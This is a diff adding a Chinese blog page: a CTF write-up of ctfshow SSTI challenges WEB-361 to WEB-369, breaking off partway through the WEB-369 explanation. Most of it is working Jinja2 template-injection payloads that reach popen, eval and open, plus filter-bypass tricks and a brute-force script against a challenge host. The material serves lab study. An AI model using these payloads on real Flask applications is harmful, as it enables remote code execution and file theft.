@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-trophy-1.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="ctfshow-ssti">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow-ssti">
+<meta property="og:url" content="http://example.com/post/7eb33f7a.html">
+<meta property="og:site_name" content="Z1d10tのBlog">
+<meta property="og:description" content="ctfshow-ssti">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692683423226-16a1cfbb-13c7-49d8-8421-d7d38b39e349.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692699535461-6fe5aca5-bfd2-406e-aef9-9ec52ed5e842.png">
+<meta property="article:published_time" content="2023-08-23T06:06:04.000Z">
+<meta property="article:modified_time" content="2023-08-23T06:07:16.598Z">
+<meta property="article:author" content="Z1d10t">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692683423226-16a1cfbb-13c7-49d8-8421-d7d38b39e349.png">
+
+
+<link rel="canonical" href="http://example.com/post/7eb33f7a.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/post/7eb33f7a.html","path":"post/7eb33f7a.html","title":"ctfshow-ssti"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfshow-ssti | Z1d10tのBlog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Z1d10tのBlog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> </p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>博主</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-361"><span class="nav-number">1.</span> <span class="nav-text">WEB-361</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-362-%E8%BF%87%E6%BB%A4%E4%BA%86os-wrap-close"><span class="nav-number">2.</span> <span class="nav-text">WEB-362(过滤了os.wrap_close)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-363-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="nav-number">3.</span> <span class="nav-text">WEB-363(过滤单双引号)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-364-%E8%BF%87%E6%BB%A4%E4%BA%86args"><span class="nav-number">4.</span> <span class="nav-text">WEB-364(过滤了args)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-365-%E8%BF%87%E6%BB%A4%E4%BA%86%E6%96%B9%E6%8B%AC%E5%8F%B7"><span class="nav-number">5.</span> <span class="nav-text">WEB-365(过滤了方括号)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-1"><span class="nav-number">5.1.</span> <span class="nav-text">payload_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-2"><span class="nav-number">5.2.</span> <span class="nav-text">payload_2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-366-%E8%BF%87%E6%BB%A4%E4%BA%86%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="nav-number">6.</span> <span class="nav-text">WEB-366(过滤了下划线)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-367-%E8%BF%87%E6%BB%A4%E4%BA%86os"><span class="nav-number">7.</span> <span class="nav-text">WEB-367(过滤了os)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-368-%E8%BF%87%E6%BB%A4%E4%BA%86%E5%B7%A6%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="nav-number">8.</span> <span class="nav-text">WEB-368(过滤了左花括号)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-369-%E8%BF%87%E6%BB%A4%E4%BA%86request"><span class="nav-number">9.</span> <span class="nav-text">WEB-369(过滤了request)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-1-1"><span class="nav-number">9.1.</span> <span class="nav-text">payload_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-2-1"><span class="nav-number">9.2.</span> <span class="nav-text">payload_2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-370-%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97"><span class="nav-number">10.</span> <span class="nav-text">WEB-370(过滤数字)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-371-%E8%BF%87%E6%BB%A4print%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-number">11.</span> <span class="nav-text">WEB-371(过滤print无回显)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB-372-%E8%BF%87%E6%BB%A4%E4%BA%86count"><span class="nav-number">12.</span> <span class="nav-text">WEB-372(过滤了count)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%A8%80"><span class="nav-number">13.</span> <span class="nav-text">后言</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z1d10t"
+      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar2">
+  <p class="site-author-name" itemprop="name">Z1d10t</p>
+  <div class="site-description" itemprop="description">Keep Hacking</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">82</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/7eb33f7a.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar2">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10tのBlog">
+      <meta itemprop="description" content="Keep Hacking">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ctfshow-ssti | Z1d10tのBlog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow-ssti
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-08-23 14:06:04 / 修改时间：14:07:16" itemprop="dateCreated datePublished" datetime="2023-08-23T14:06:04+08:00">2023-08-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>ctfshow-ssti</p>
+<span id="more"></span>
+
+<p>感觉这块网上直接找payload之外 没有真正理解答案 重新学习一下 顺便也要适应python了</p>
+<h1 id="WEB-361"><a href="#WEB-361" class="headerlink" title="WEB-361"></a>WEB-361</h1><p>无过滤</p>
+<p>payload:<code>&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code></p>
+<p>或者用lipsum包和cycler库</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;tac ../flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;cycler.__init__.__globals__.os.popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者用控制块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">print</span>(url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat ../flag&#x27;).read()&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-362-过滤了os-wrap-close"><a href="#WEB-362-过滤了os-wrap-close" class="headerlink" title="WEB-362(过滤了os.wrap_close)"></a>WEB-362(过滤了os.wrap_close)</h1><p>用上一题的其他方式就行</p>
+<h1 id="WEB-363-过滤单双引号"><a href="#WEB-363-过滤单双引号" class="headerlink" title="WEB-363(过滤单双引号)"></a>WEB-363(过滤单双引号)</h1><p>get传参方式绕过或<code>request.cookies.x</code>都行</p>
+<p>需要注意的是<code>url_for.__builtins__</code>下没有os 但是可以用eval</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.args.ocean).read()&#125;&#125;&amp;ocean =cat /flag</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c)&#125;&#125;&amp;a=__builtins__&amp;b=<span class="built_in">eval</span>&amp;c=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>还有就是通过config配置信息截字符 截取到os</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692683423226-16a1cfbb-13c7-49d8-8421-d7d38b39e349.png" alt="img"></p>
+<p><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2b(config.__str__()[42])]&#125;&#125;</code>这里需要注意就是<code>%2b</code>是 <code>+</code>的url编码 不加的话就会报错</p>
+<h1 id="WEB-364-过滤了args"><a href="#WEB-364-过滤了args" class="headerlink" title="WEB-364(过滤了args)"></a>WEB-364(过滤了args)</h1><p>也就是我们不能get传参了直接ban了 <code>request.args</code> 其实还可以用cookie</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;</span><br><span class="line">cookie 传参:a=os;b=popen;c=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>第二种：</p>
+<p>values可以获取所有参数 绕过args</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.x).read()&#125;&#125;&amp;x=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-365-过滤了方括号"><a href="#WEB-365-过滤了方括号" class="headerlink" title="WEB-365(过滤了方括号)"></a>WEB-365(过滤了方括号)</h1><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload_1"></a>payload_1</h2><p>values传参</p>
+<p>values 没有被过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;lipsum.__globals__.os.popen(request.values.x).read()&#125;&#125;&amp;x=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>或者cookie都行</p>
+<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload_2"></a>payload_2</h2><p>字符串拼接</p>
+<p><code>[]</code>可以用<code>.</code>或者<code>__getitem__</code>本质就是它</p>
+<p>其他师傅的脚本如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># anthor:秀儿</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://bbb42674-c33e-4370-b602-c3318e79fa64.challenge.ctf.show/?name=&#123;&#123;config.__str__().__getitem__(%d)&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        r=requests.get(url=url%(i))</span><br><span class="line">        location=r.text.find(<span class="string">&quot;&lt;h3&gt;&quot;</span>)</span><br><span class="line">        word=r.text[location+<span class="number">4</span>:location+<span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> word==j:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;config.__str__().__getitem__(%d) == %s&quot;</span>%(i,j))</span><br><span class="line">            result+=<span class="string">&quot;config.__str__().__getitem__(%d)~&quot;</span>%(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result[:<span class="built_in">len</span>(result)-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+
+<p>然后用<code>~</code>连接起来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__.os.popen(config.__str__().__getitem__(<span class="number">22</span>)~config.__str__().__getitem__(<span class="number">40</span>)~config.__str__().__getitem__(<span class="number">23</span>)~config.__str__().__getitem__(<span class="number">7</span>)~config.__str__().__getitem__(<span class="number">279</span>)~config.__str__().__getitem__(<span class="number">4</span>)~config.__str__().__getitem__(<span class="number">41</span>)~config.__str__().__getitem__(<span class="number">40</span>)~config.__str__().__getitem__(<span class="number">6</span>)</span><br><span class="line">).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-366-过滤了下划线"><a href="#WEB-366-过滤了下划线" class="headerlink" title="WEB-366(过滤了下划线)"></a>WEB-366(过滤了下划线)</h1><p>可以用过滤器</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line">cookie:a=__globals__;b=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-367-过滤了os"><a href="#WEB-367-过滤了os" class="headerlink" title="WEB-367(过滤了os)"></a>WEB-367(过滤了os)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p><code>lipsum.__globals__.get(os).popen(c=cat /flag)</code>最终构造是这个</p>
+<p>由于<code>[]</code>也是被waf了所以我们可以通过get(os)方式 之前我们都是<code>lipsum.__globals__[&#39;os&#39;]</code></p>
+<p>也算是一个小trick</p>
+<h1 id="WEB-368-过滤了左花括号"><a href="#WEB-368-过滤了左花括号" class="headerlink" title="WEB-368(过滤了左花括号)"></a>WEB-368(过滤了左花括号)</h1><p>用<code>&#123;%print()%&#125;</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%<span class="built_in">print</span>((lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read())%&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="WEB-369-过滤了request"><a href="#WEB-369-过滤了request" class="headerlink" title="WEB-369(过滤了request)"></a>WEB-369(过滤了request)</h1><h2 id="payload-1-1"><a href="#payload-1-1" class="headerlink" title="payload_1"></a>payload_1</h2><p>截取配置config构造 这类下划线被ban了 不能用<code>__str()__</code>    所以就要用过滤器了</p>
+<p>获取字符串后本来要用<code>__getitem__</code>问题是<code>_</code>被ban了</p>
+<p>所以这里需要转换成list然后用<code>pop()</code>就可以得到我们想要的字符</p>
+<p>师傅们的payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">print</span> (lipsum|attr((config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">6</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">2</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">33</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">42</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">74</span>).lower()</span><br><span class="line">)).get((config|string|<span class="built_in">list</span>).pop(<span class="number">2</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">42</span>).lower()).popen((config|string|<span class="built_in">list</span>).pop(<span class="number">1</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">23</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">7</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">279</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">4</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">41</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">40</span>).lower()~(config|string|<span class="built_in">list</span>).pop(<span class="number">6</span>).lower()).read() %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以来剖析一下</p>
+<p>总体是用<code>(config|string|list).pop(下标).lower()</code>这种方式去截取我们想要的字符</p>
+<p>然后转为小写 用<code>~</code>连接起来 这里还是存在那个trick 要用<code>get(&#39;os&#39;)</code>去代替<code>[&#39;os&#39;]</code>因为方括号被ban了</p>
+<h2 id="payload-2-1"><a href="#payload-2-1" class="headerlink" title="payload_2"></a>payload_2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">构造po=<span class="string">&quot;pop&quot;</span>     <span class="comment">#利用dict()|join拼接得到</span></span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;  <span class="comment">#po=pop</span></span><br><span class="line"> </span><br><span class="line">等效于a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>),即a等价于下划线_</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125; <span class="comment">#a=_</span></span><br><span class="line"> </span><br><span class="line">构造ini=<span class="string">&quot;___init__&quot;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;<span class="comment">#元组可以一层一层看好理解ini=__init__ 用了两个join</span></span><br><span class="line"> </span><br><span class="line">构造glo=<span class="string">&quot;__globals__&quot;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class="line"> </span><br><span class="line">构造geti=<span class="string">&quot;__getitem__&quot;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line"> </span><br><span class="line">构造built=<span class="string">&quot;__builtins__&quot;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line"> </span><br><span class="line">调用<span class="built_in">chr</span>()函数  注意这里q取任何值都行 没有特别的意义</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;<span class="comment">#x=q.__init__.globals__.__getitem__(__builtins__)</span></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;<span class="comment">#chr=q.__init__.globals__.__getitem__(__builtins__).chr </span></span><br><span class="line"> </span><br><span class="line">构造file=<span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;<span class="comment"># %2b是+ 一定要有</span></span><br></pre></td></tr></table></figure>
+
